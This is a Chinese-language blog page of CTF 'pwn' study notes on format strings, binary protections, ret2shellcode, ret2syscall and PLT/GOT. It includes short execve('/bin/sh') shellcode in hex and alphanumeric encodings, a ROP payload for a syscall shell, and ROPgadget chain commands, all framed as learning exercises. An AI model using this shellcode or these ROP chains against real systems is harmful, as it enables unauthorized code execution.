href="#%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D%E5%87%BD%E6%95%B0"><span class="toc-text">内存分配函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#chunk"><span class="toc-text">chunk</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bin"><span class="toc-text">bin</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#fastbins"><span class="toc-text">fastbins</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#unsorted-bin"><span class="toc-text">unsorted bin</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#small-bin"><span class="toc-text">small bin</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#large-bin"><span class="toc-text">large bin</span></a></li></ol></li></ol></li></ol></li></ol>
    
<style>
    .left-col .switch-btn,
    .left-col .switch-area {
        display: none;
    }
    .toc-level-3 i,
    .toc-level-3 ol {
        display: none !important;
    }
</style>
</div>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p><div class='inner-toc'><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Reverse"><span class="toc-text">Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-IDA%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C"><span class="toc-text">1.IDA基础操作</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PWN"><span class="toc-text">PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-text">二进制基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E"><span class="toc-text">格式化字符串漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%87%BD%E6%95%B0"><span class="toc-text">函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BD%AC%E6%8D%A2%E6%8C%87%E7%A4%BA%E7%AC%A6"><span class="toc-text">转换指示符</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%95%BF%E5%BA%A6"><span class="toc-text">长度</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8%E5%B1%9E%E6%80%A7"><span class="toc-text">二进制安全属性</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#symbol"><span class="toc-text">symbol</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#canary"><span class="toc-text">canary</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PIE"><span class="toc-text">PIE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%E3%80%81NX"><span class="toc-text">4、NX</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5%E3%80%81RELRO%EF%BC%88GOT-%E5%86%99%E4%BF%9D%E6%8A%A4%EF%BC%89"><span class="toc-text">5、RELRO（GOT 写保护）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%88%E5%AF%B9%E9%BD%90"><span class="toc-text">栈对齐</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2shellcode"><span class="toc-text">ret2shellcode</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%9F%E6%88%90shell%E4%BB%A3%E7%A0%81"><span class="toc-text">生成shell代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%AD%E5%AD%97%E8%8A%82shellcode"><span class="toc-text">短字节shellcode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%AF%E8%A7%81%E5%AD%97%E7%AC%A6shellcode"><span class="toc-text">可见字符shellcode</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-alpha3-master"><span class="toc-text">使用 alpha3-master</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#x64"><span class="toc-text">x64</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#x32"><span class="toc-text">x32</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2syscall"><span class="toc-text">ret2syscall</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#32%E4%BD%8D%E7%A8%8B%E5%BA%8F"><span class="toc-text">32位程序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#64%E4%BD%8D%E7%A8%8B%E5%BA%8F"><span class="toc-text">64位程序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8"><span class="toc-text">系统调用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#e-g"><span class="toc-text">e.g.</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7"><span class="toc-text">工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PLT-GOT"><span class="toc-text">PLT&amp;GOT</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#system-0-%E5%87%BD%E6%95%B0"><span class="toc-text">system($0)函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2libc"><span class="toc-text">ret2libc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#e-g-2021-%E9%B9%A4%E5%9F%8E%E6%9D%AF-babyof-NSSCTF"><span class="toc-text">e.g.[2021 鹤城杯]babyof | NSSCTF</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#exp"><span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2021-%E9%B9%A4%E5%9F%8E%E6%9D%AFCanary-littleof"><span class="toc-text">[2021 鹤城杯Canary]littleof</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Canary%E7%BB%95%E8%BF%87"><span class="toc-text">Canary绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp-1"><span class="toc-text">exp</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2csu"><span class="toc-text">ret2csu</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-2"><span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E-1"><span class="toc-text">格式化字符串漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E7%9A%84%E5%86%85%E5%AD%98"><span class="toc-text">泄露任意地址的内存</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A6%86%E7%9B%96%E6%A0%88%E5%86%85%E5%AD%98"><span class="toc-text">覆盖栈内存</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A6%86%E7%9B%96%E5%B0%8F%E6%95%B0%E5%AD%97"><span class="toc-text">覆盖小数字</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A6%86%E7%9B%96%E5%A4%A7%E6%95%B0%E5%AD%97"><span class="toc-text">覆盖大数字</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#x64%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-text">x64格式化字符串</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90"><span class="toc-text">例子</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pwntools-pwnlib-fmtstr-%E6%A8%A1%E5%9D%97"><span class="toc-text">pwntools pwnlib.fmtstr 模块</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA"><span class="toc-text">整数溢出</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%89%E7%AC%A6%E5%8F%B7%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA"><span class="toc-text">有符号整数溢出</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E6%88%98"><span class="toc-text">实战</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BROP"><span class="toc-text">BROP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0"><span class="toc-text">题目复现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-1"><span class="toc-text">原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%BE%E5%88%B0%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E"><span class="toc-text">找到栈溢出漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#stop-gadget"><span class="toc-text">stop gadget</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#canary%E7%BB%95%E8%BF%87"><span class="toc-text">canary绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80-%E8%A6%86%E7%9B%96%E6%88%AA%E6%96%AD%E5%AD%97%E7%AC%A6%E8%8E%B7%E5%8F%96Canary"><span class="toc-text">方法一 覆盖截断字符获取Canary</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-2"><span class="toc-text">原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90-1"><span class="toc-text">例子</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C-%E5%88%A9%E7%94%A8%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E8%8E%B7%E5%8F%96Canary"><span class="toc-text">方法二 利用格式化字符串漏洞获取Canary</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-3"><span class="toc-text">原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp-3"><span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%89-%E9%80%90%E5%AD%97%E8%8A%82%E7%88%86%E7%A0%B4"><span class="toc-text">方法三 逐字节爆破</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-4"><span class="toc-text">原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#e-g-1"><span class="toc-text">e.g.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp-4"><span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%AB%E6%8C%81-stack-chk-fail%E5%87%BD%E6%95%B0"><span class="toc-text">劫持__stack_chk_fail函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-5"><span class="toc-text">原理</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn-random%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%AF%87"><span class="toc-text">pwn random伪随机数篇</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#glibc"><span class="toc-text">glibc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#random"><span class="toc-text">random</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E3%80%90PWN-%C2%B7-%E6%80%BB%E7%BB%93%E3%80%91"><span class="toc-text">【PWN · 总结】</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#call-system%E4%B8%8Esystem%E8%B0%83%E7%94%A8"><span class="toc-text">call _system与system调用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-text">利用方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%87%8D%E5%86%99fini-array"><span class="toc-text">重写fini_array</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A0%86%E6%BA%A2%E5%87%BA"><span class="toc-text">堆溢出</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-text">前置知识</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D%E5%87%BD%E6%95%B0"><span class="toc-text">内存分配函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#chunk"><span class="toc-text">chunk</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bin"><span class="toc-text">bin</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#fastbins"><span class="toc-text">fastbins</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#unsorted-bin"><span class="toc-text">unsorted bin</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#small-bin"><span class="toc-text">small bin</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#large-bin"><span class="toc-text">large bin</span></a></li></ol></li></ol></li></ol></li></ol></div></p>
<h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="1-IDA基础操作"><a href="#1-IDA基础操作" class="headerlink" title="1.IDA基础操作"></a>1.IDA基础操作</h2><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="二进制基础知识"><a href="#二进制基础知识" class="headerlink" title="二进制基础知识"></a>二进制基础知识</h2><h3 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h3><h4 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">printf</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *format, ...)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">fprintf</span><span class="params">(FILE *stream, <span class="type">const</span> <span class="type">char</span> *format, ...)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">dprintf</span><span class="params">(<span class="type">int</span> fd, <span class="type">const</span> <span class="type">char</span> *format, ...)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">sprintf</span><span class="params">(<span class="type">char</span> *str, <span class="type">const</span> <span class="type">char</span> *format, ...)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">snprintf</span><span class="params">(<span class="type">char</span> *str, <span class="type">size_t</span> size, <span class="type">const</span> <span class="type">char</span> *format, ...)</span>;</span><br></pre></td></tr></table></figure>

<h4 id="转换指示符"><a href="#转换指示符" class="headerlink" title="转换指示符"></a>转换指示符</h4><table>
<thead>
<tr>
<th>字符</th>
<th>类型</th>
<th>使用</th>
</tr>
</thead>
<tbody><tr>
<td>d</td>
<td>4-byte</td>
<td>Integer</td>
</tr>
<tr>
<td>u</td>
<td>4-byte</td>
<td>Unsigned Integer</td>
</tr>
<tr>
<td>x</td>
<td>4-byte</td>
<td>Hex</td>
</tr>
<tr>
<td>s</td>
<td>4-byte ptr</td>
<td>String</td>
</tr>
<tr>
<td>c</td>
<td>1-byte</td>
<td>Character</td>
</tr>
</tbody></table>
<h4 id="长度"><a href="#长度" class="headerlink" title="长度"></a>长度</h4><table>
<thead>
<tr>
<th>字符</th>
<th>类型</th>
<th>使用</th>
</tr>
</thead>
<tbody><tr>
<td>hh</td>
<td>1-byte</td>
<td>char</td>
</tr>
<tr>
<td>h</td>
<td>2-byte</td>
<td>short int</td>
</tr>
<tr>
<td>l</td>
<td>4-byte</td>
<td>long int</td>
</tr>
<tr>
<td>ll</td>
<td>8-byte</td>
<td>long long int</td>
</tr>
</tbody></table>
<h2 id="二进制安全属性"><a href="#二进制安全属性" class="headerlink" title="二进制安全属性"></a>二进制安全属性</h2><h3 id="symbol"><a href="#symbol" class="headerlink" title="symbol"></a>symbol</h3><p>在编译期间，某些 *符号(symbols)*包含在二进制文件中，这些符号主要用作于调试。开发软件时，需要用到这些符号，来调试和修复错误。</p>
<h3 id="canary"><a href="#canary" class="headerlink" title="canary"></a>canary</h3><p>Canary 是放置在缓冲区和 <em>栈(stack)</em> 上的控制数据之间的已知值，它用于监视缓冲区是否溢出。</p>
<h3 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h3><p>*位置无关可执行文件(Position-Independent Executable)*（PIE），顾名思义，它指的是放置在内存中某处执行的代码，不管其绝对地址的位置，即代码段、数据段地址随机化（ASLR）</p>
<h3 id="4、NX"><a href="#4、NX" class="headerlink" title="4、NX"></a><strong>4、NX</strong></h3><p>NX 代表 *不可执行(non-executable)*。它通常在 CPU 层面上启用，因此启用 NX 的操作系统可以将某些内存区域标记为不可执行。通常，缓冲区溢出漏洞将恶意代码放在堆栈上，然后尝试执行它。但是，让堆栈这些可写区域变得不可执行，可以防止这种攻击。</p>
<h3 id="5、RELRO（GOT-写保护）"><a href="#5、RELRO（GOT-写保护）" class="headerlink" title="5、RELRO（GOT 写保护）"></a><strong>5、RELRO（GOT 写保护）</strong></h3><p>RELRO 代表 “*重定位只读(Relocation Read-Only)*”。可执行链接格式（ELF）二进制文件使用全局偏移表（GOT）来动态地解析函数。启用 RELRO 后，会设置二进制文件中的 GOT 表为只读，从而防止重定位攻击：</p>
<h2 id="栈对齐"><a href="#栈对齐" class="headerlink" title="栈对齐"></a>栈对齐</h2><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/611961995">CTFer成长日记12：栈对齐—获取shell前的临门一脚 - 知乎 (zhihu.com)</a></p>
<h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><p>通过 gdb 查看 bss 段可执行，所以把只要把内容写到这个地方，然后返回地址跳转到 bss 段就可以执行 shellcode</p>
<h3 id="生成shell代码"><a href="#生成shell代码" class="headerlink" title="生成shell代码"></a>生成shell代码</h3><p><strong>使用shellcraft生成的默认是44字节</strong></p>
<p><code>shellcode = asm(shellcraft.sh())</code></p>
<h3 id="短字节shellcode"><a href="#短字节shellcode" class="headerlink" title="短字节shellcode"></a>短字节shellcode</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">32 位 短字节 shellcode -&gt; 21 字节</span><br><span class="line">\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80</span><br><span class="line"></span><br><span class="line">64 位 较短的 shellcode 23 字节</span><br><span class="line">\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f</span><br><span class="line">\x05</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><strong>如果buf长度不够容纳，可以截断分两次执行</strong></p>
<h3 id="可见字符shellcode"><a href="#可见字符shellcode" class="headerlink" title="可见字符shellcode"></a>可见字符shellcode</h3><h4 id="使用-alpha3-master"><a href="#使用-alpha3-master" class="headerlink" title="使用 alpha3-master"></a>使用 alpha3-master</h4><h4 id="x64"><a href="#x64" class="headerlink" title="x64"></a>x64</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t</span><br></pre></td></tr></table></figure>

<h4 id="x32"><a href="#x32" class="headerlink" title="x32"></a>x32</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8MK0AA</span><br></pre></td></tr></table></figure>



<h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><h3 id="32位程序"><a href="#32位程序" class="headerlink" title="32位程序"></a>32位程序</h3><p>参数利用栈来传递，所以调用system函数时要把参数放入栈中</p>
<h3 id="64位程序"><a href="#64位程序" class="headerlink" title="64位程序"></a>64位程序</h3><p><strong>优先利用寄存器传递参数（rdi, rsi, rdx, rcx, r8, r9）</strong></p>
<h3 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h3><p><strong>Linux 的系统调用通过 int 80h 实现</strong>，用系统调用号来区分入口函数</p>
<p><strong>应用程序调用系统调用的过程是：</strong></p>
<p>1、把<strong>系统调用的编号存入 EAX</strong></p>
<p>2、把<strong>函数参数存入其它通用寄存器</strong></p>
<p>3、<strong>触发 0x80 号中断</strong>（int 0x80）</p>
<p>那么我们如果希望通过系统调用来获取 shell 就需要把系统调用的参数放入各个寄存器，然后执行 int 0x80 就可以了</p>
<h4 id="e-g"><a href="#e-g" class="headerlink" title="e.g."></a>e.g.</h4><p>如果说想通过系统调用执行的是：<code> execve(&quot;/bin/sh&quot;,NULL,NULL)</code>（32位程序）</p>
<p>那么 eax 寄存器应该放系统调用号，查看 execve 的系统调用号：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /usr/include/asm/unistd_32.h | grep execve </span><br></pre></td></tr></table></figure>



<p>所以现在需要做的就是让：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">eax=0xb</span><br><span class="line"></span><br><span class="line">ebx=/bin/sh 的地址</span><br><span class="line"></span><br><span class="line">ecx=0</span><br><span class="line"></span><br><span class="line">edx=0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>使用命令找到 pop eax：<code> ROPgadget --binary rop  --only &#39;pop|ret&#39; | grep &#39;eax&#39;</code></p>
<p>同时使用：<code>ROPgadget --binary rop --string &#39;/bin/sh&#39;</code> 找到 ‘&#x2F;bin&#x2F;sh’ 字符串在什么地方</p>
<p>以及需要的 int 0x80：<code>ROPgadget --binary rop --only &#39;int&#39;</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">112</span>+p32(pop_eax_ret)+p32(<span class="number">0xb</span>)+p32(pop_other_ret)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(bin_addr)+p32(int_addr)</span><br><span class="line"><span class="comment"># 先填充垃圾数据，然后放入pop_eax_ret的地址，跳转过去执行pop_eax，所以下一个填需要赋值给eax的0xb，接着ret到pop_edx_ecx_ebx的地方，将参数放入，最后ret到int函数地址进行调用系统函数</span></span><br></pre></td></tr></table></figure>

<h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p>直接生成调用函数的代码</p>
<p><strong>使用ropper和ROPgadget</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ropper --file inndy_rop --chain execveropper --file inndy_rop --chein exceve		// 直接生成实现exceve函数的代码</span><br><span class="line"></span><br><span class="line">ROPgadget --binary inndy_rop --ropchain</span><br></pre></td></tr></table></figure>





<h3 id="PLT-GOT"><a href="#PLT-GOT" class="headerlink" title="PLT&amp;GOT"></a>PLT&amp;GOT</h3><p>linux下的动态链接是通过PLT&amp;GOT来实现的，这里做一个实验，通过这个实验来理解</p>
<p>使用如下源代码 test.c：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">void print_banner()</span><br><span class="line">&#123;</span><br><span class="line">    printf(&quot;Welcome to World of PLT and GOT\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">    print_banner();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>依次使用下列命令进行编译：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -Wall -g -o test.o -c test.c -m32</span><br><span class="line">gcc -o test test.o -m32</span><br></pre></td></tr></table></figure>



<p>这样除了原有的 test.c 还有个 test.o 以及可执行文件 test</p>
<p>通过 <code>objdump -d test.o</code> 可以查看反汇编</p>
<p>通过 <code>objdump -d test &gt; test.asm</code> 可以看到其中 plt 表项有三条指令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Disassembly of section .plt:</span><br><span class="line"></span><br><span class="line">080482d0 &lt;common@plt&gt;:</span><br><span class="line"> // 一个公共参数？</span><br><span class="line"> 80482d0:	ff 35 04 a0 04 08    	pushl  0x804a004</span><br><span class="line"> // 跳转到_dl_runtime_resolve函数</span><br><span class="line"> 80482d6:	ff 25 08 a0 04 08    	jmp    *0x804a008	</span><br><span class="line"> 80482dc:	00 00                	add    %al,(%eax)</span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">080482e0 &lt;puts@plt&gt;:</span><br><span class="line"> // 第一个是跳转到got表指向的地址，绑定后就存放动态链接库中对应的函数地址</span><br><span class="line"> 80482e0:	ff 25 0c a0 04 08    	jmp    *0x804a00c</span><br><span class="line"> // 第二个是系统函数的标号，作为_dl_runtime_resolve函数的参数</span><br><span class="line"> 80482e6:	68 00 00 00 00       	push   $0x0</span><br><span class="line"> // 第三个都相同，common@plt 的地址</span><br><span class="line"> 80482eb:	e9 e0 ff ff ff       	jmp    80482d0 &lt;_init+0x28&gt;</span><br><span class="line"></span><br><span class="line">080482f0 &lt;__libc_start_main@plt&gt;:</span><br><span class="line"> 80482f0:	ff 25 10 a0 04 08    	jmp    *0x804a010</span><br><span class="line"> 80482f6:	68 08 00 00 00       	push   $0x8</span><br><span class="line"> 80482fb:	e9 d0 ff ff ff       	jmp    80482d0 &lt;_init+0x28&gt;</span><br></pre></td></tr></table></figure>

<p>ps.这里 plt 表的第一项使用 objdump 的时候给没有符号名的一项自动改成了离他最近的一项，为了避免引起误会，改成了 common，而且随着不断深入，会发现，确实可以叫 common</p>
<p>其中除第一个表项以外，plt 表的第一条都是跳转到对应的 got 表项，而 got 表项的内容我们可以通过 gdb 来看一下，如果函数还没有执行的时候，这里的地址是对应 plt 表项的下一条命令，即 push 0x0</p>
<h3 id="system-0-函数"><a href="#system-0-函数" class="headerlink" title="system($0)函数"></a>system(<code>$0</code>)函数</h3><p>知识点：可以利用<code>system($0)</code>获得shell权限，<code>$0</code>在机器码中为 <code>\x24\x30</code></p>
